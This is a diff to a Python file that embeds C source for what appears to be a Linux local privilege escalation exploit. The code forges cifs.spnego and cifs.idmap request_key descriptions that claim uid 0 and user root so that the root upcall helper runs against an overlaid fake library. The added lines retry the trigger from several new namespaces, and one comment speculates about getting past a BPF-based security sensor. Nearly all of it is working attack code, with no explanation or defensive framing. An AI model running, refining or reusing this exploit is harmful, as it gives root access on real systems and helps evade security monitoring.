@@ -201,6 +201,7 @@ TRIGGER_SOURCE = r'''
 #include <errno.h>
 #include <fcntl.h>
 #include <linux/keyctl.h>
+#include <sched.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -268,19 +269,66 @@ static int do_overlay(const char *fakelib, const char *libdir,
         return -1;
 }
 
-static void run_binary(const char *path, const char *argv0, const char *arg1)
+static long try_spnego_in_child_ns(int extra_flags, const char *label,
+                                   const char *desc)
 {
+        int pipefd[2];
+        pipe(pipefd);
         pid_t pid = fork();
         if (pid == 0) {
-                execl(path, argv0, arg1, (char *)NULL);
-                _exit(127);
+                close(pipefd[0]);
+                /* Try extra namespace isolation */
+                if (extra_flags) {
+                        int rc = unshare(extra_flags);
+                        if (rc != 0) {
+                                fprintf(stderr, "    [%s] unshare(0x%x) failed: %s\n",
+                                        label, extra_flags, strerror(errno));
+                        }
+                }
+                /* If PID ns, need to fork again */
+                if (extra_flags & CLONE_NEWPID) {
+                        pid_t inner = fork();
+                        if (inner == 0) {
+                                char newdesc[768];
+                                snprintf(newdesc, sizeof(newdesc),
+                                         "ver=0x2;host=localhost;ip4=127.0.0.1;sec=krb5;"
+                                         "uid=0x0;creduid=0x0;pid=%d;upcall_target=app;user=root",
+                                         getppid()); /* parent pid = the ns-setup process */
+                                errno = 0;
+                                long r = syscall(NR_request_key, "cifs.spnego", newdesc, "",
+                                                 KEY_SPEC_SESSION_KEYRING);
+                                int e = errno;
+                                dprintf(pipefd[1], "%ld %d", r, e);
+                                close(pipefd[1]);
+                                _exit(0);
+                        }
+                        if (inner > 0) {
+                                int st;
+                                waitpid(inner, &st, 0);
+                        }
+                        close(pipefd[1]);
+                        _exit(0);
+                }
+                errno = 0;
+                long r = syscall(NR_request_key, "cifs.spnego", desc, "",
+                                 KEY_SPEC_SESSION_KEYRING);
+                int e = errno;
+                dprintf(pipefd[1], "%ld %d", r, e);
+                close(pipefd[1]);
+                _exit(0);
         }
-        if (pid > 0) {
-                int st;
-                waitpid(pid, &st, 0);
-                fprintf(stderr, "    %s exit=%d\n", path,
-                        WIFEXITED(st) ? WEXITSTATUS(st) : -1);
-        }
+        close(pipefd[1]);
+        char buf[64] = {0};
+        read(pipefd[0], buf, sizeof(buf)-1);
+        close(pipefd[0]);
+        int st;
+        waitpid(pid, &st, 0);
+
+        long rc = -1;
+        int err = 0;
+        sscanf(buf, "%ld %d", &rc, &err);
+        fprintf(stderr, "    [%s] rc=%ld errno=%d (%s)\n", label, rc, err, strerror(err));
+        return rc;
 }
 
 int main(int argc, char **argv)
@@ -321,66 +369,52 @@ int main(int argc, char **argv)
                  "uid=0x0;creduid=0x0;pid=%d;upcall_target=app;user=root",
                  getpid());
 
-        /* METHOD 1: request_key cifs.spnego (original) */
-        fprintf(stderr, "\n[1] request_key(cifs.spnego)\n");
+        /* METHOD 1: request_key cifs.spnego — baseline (expect EPERM) */
+        fprintf(stderr, "\n[1] request_key(cifs.spnego) — baseline\n");
         errno = 0;
         ret = syscall(NR_request_key, "cifs.spnego", desc, "",
                       KEY_SPEC_SESSION_KEYRING);
         fprintf(stderr, "    rc=%ld errno=%d (%s)\n", ret, errno, strerror(errno));
-        if (ret >= 0 || errno == ENOKEY || errno == EINTR) {
-                sleep(3);
-                if (check_evidence()) return 0;
-        }
+        if (ret >= 0) { sleep(3); if (check_evidence()) return 0; }
 
-        /* METHOD 2: request_key cifs.idmap */
-        fprintf(stderr, "[2] request_key(cifs.idmap)\n");
+        /* METHOD 2-6: try cifs.spnego from ADDITIONAL namespace isolation
+         * Maybe CS BPF checks namespace context and skips in certain configs */
+        fprintf(stderr, "\n[2] cifs.spnego + PID namespace\n");
+        ret = try_spnego_in_child_ns(CLONE_NEWPID, "pid", desc);
+        if (ret >= 0) { sleep(3); if (check_evidence()) return 0; }
+
+        fprintf(stderr, "[3] cifs.spnego + NET namespace\n");
+        ret = try_spnego_in_child_ns(CLONE_NEWNET, "net", desc);
+        if (ret >= 0) { sleep(3); if (check_evidence()) return 0; }
+
+        fprintf(stderr, "[4] cifs.spnego + IPC namespace\n");
+        ret = try_spnego_in_child_ns(CLONE_NEWIPC, "ipc", desc);
+        if (ret >= 0) { sleep(3); if (check_evidence()) return 0; }
+
+        fprintf(stderr, "[5] cifs.spnego + PID+NET+IPC\n");
+        ret = try_spnego_in_child_ns(CLONE_NEWPID | CLONE_NEWNET | CLONE_NEWIPC, "all", desc);
+        if (ret >= 0) { sleep(3); if (check_evidence()) return 0; }
+
+        fprintf(stderr, "[6] cifs.spnego + UTS+CGROUP\n");
+        ret = try_spnego_in_child_ns(CLONE_NEWUTS | CLONE_NEWCGROUP, "uts+cg", desc);
+        if (ret >= 0) { sleep(3); if (check_evidence()) return 0; }
+
+        /* METHOD 7: cifs.spnego via raw syscall with pid ns fork — different cred context */
+        fprintf(stderr, "[7] cifs.spnego + ALL namespaces\n");
+        ret = try_spnego_in_child_ns(
+                CLONE_NEWPID | CLONE_NEWNET | CLONE_NEWIPC | CLONE_NEWUTS | CLONE_NEWCGROUP,
+                "full", desc);
+        if (ret >= 0) { sleep(3); if (check_evidence()) return 0; }
+
+        /* METHOD 8: request_key cifs.idmap (handler runs as root, no setns) */
+        fprintf(stderr, "\n[8] request_key(cifs.idmap) — root handler check\n");
         errno = 0;
         ret = syscall(NR_request_key, "cifs.idmap", desc, "",
                       KEY_SPEC_SESSION_KEYRING);
         fprintf(stderr, "    rc=%ld errno=%d (%s)\n", ret, errno, strerror(errno));
-        if (ret >= 0 || errno == ENOKEY || errno == EINTR) {
-                sleep(3);
-                if (check_evidence()) return 0;
-        }
+        if (ret >= 0 || errno == ENOKEY) { sleep(3); if (check_evidence()) return 0; }
 
-        /* METHOD 3: request_key(user, "debug:...") to create key, then exec cifs.upcall */
-        {
-                char udesc[800];
-                snprintf(udesc, sizeof(udesc),
-                         "debug:x;ver=0x2;host=localhost;ip4=127.0.0.1;sec=krb5;"
-                         "uid=0x0;creduid=0x0;pid=%d;upcall_target=app;user=root",
-                         getpid());
-                fprintf(stderr, "[3] request_key(user) + cifs.upcall <key>\n");
-                errno = 0;
-                ret = syscall(NR_request_key, "user", udesc, "x",
-                              KEY_SPEC_SESSION_KEYRING);
-                fprintf(stderr, "    request_key(user) rc=%ld errno=%d (%s)\n",
-                        ret, errno, strerror(errno));
-                if (ret >= 0) {
-                        char ks[32];
-                        snprintf(ks, sizeof(ks), "%ld", ret);
-                        fprintf(stderr, "    key=%s, exec cifs.upcall...\n", ks);
-                        run_binary("/usr/sbin/cifs.upcall", "cifs.upcall", ks);
-                        sleep(3);
-                        if (check_evidence()) return 0;
-
-                        fprintf(stderr, "[4] cifs.idmap as cifs.upcall <key>\n");
-                        run_binary("/usr/sbin/cifs.idmap", "cifs.upcall", ks);
-                        sleep(3);
-                        if (check_evidence()) return 0;
-                }
-        }
-
-        /* METHOD 5: request_key dns_resolver */
-        fprintf(stderr, "[5] request_key(dns_resolver)\n");
-        errno = 0;
-        ret = syscall(NR_request_key, "dns_resolver", desc, "",
-                      KEY_SPEC_SESSION_KEYRING);
-        fprintf(stderr, "    rc=%ld errno=%d (%s)\n", ret, errno, strerror(errno));
-        sleep(2);
-        if (check_evidence()) return 0;
-
-        fprintf(stderr, "\n[-] No evidence from any method\n");
+        fprintf(stderr, "\n[-] No method succeeded\n");
         return 1;
 }
 '''
